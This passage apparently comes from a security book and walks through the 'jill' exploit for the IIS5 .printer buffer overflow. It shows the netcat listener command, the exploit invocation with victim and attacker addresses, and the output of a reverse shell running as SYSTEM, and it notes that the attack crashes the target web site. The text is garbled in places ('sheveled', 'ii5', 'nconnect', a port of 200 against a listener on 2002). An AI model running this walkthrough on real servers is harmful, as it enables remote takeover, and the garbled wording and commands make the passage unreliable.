Several canned exploits of the .printer problem have been posted to many popular security listings. One of the first was jill by dark spirit of beauh.org. Although jill is written in Unix C, compiling it on Windows 2000 is a snap with a Cygwin environment. jill exploits the IPP buffer overflow and connects a remote shell back to the attackers system ('shing a shell'). The sheveled shell in the context of the SYSTEM account, allowing the attacker to execute any arbitrary command on the victim.

The default Web site on the victim server stops if the sheveled isn't able to connect, if it isn't exited gracefully, or if some other error occurs. Attempts to start the Web site on the console server then fail, and the machine needs to be rebooted to recover from this condition.

Here's how the exploit works. First, start the listener on attacker's system:

```
C:\nc -vv -l -p 2002
listening on [any] 2002 ...
```

Then, launch the exploit targeted at attacker's listener:

```
C:\jill 192.168.234.252 80 192.168.234.250 200
ii5 remote .printer overflow.
dark spirit <dsprit@beauh.org> / beauh labs.

connecting...
sent...
you may need to send a carriage on your listener if the shell doesn't appear.
have fun!
```

If everything goes as planned, shortly after the exploit executes, a remote shell is sheveled to the attacker's listener. You might have to strike a carriage return to make the shell appear once the connection has been received—and after each subsequent command—as shown in the ensuing example (again, this occurs on the attacker's system):

```
C:\nc -vv -l -p 2002
listening on [any] 2002 ...nconnect to [192.168.234.250] from MANDAL [192.168.234.222] 1117
[carriage return]
```
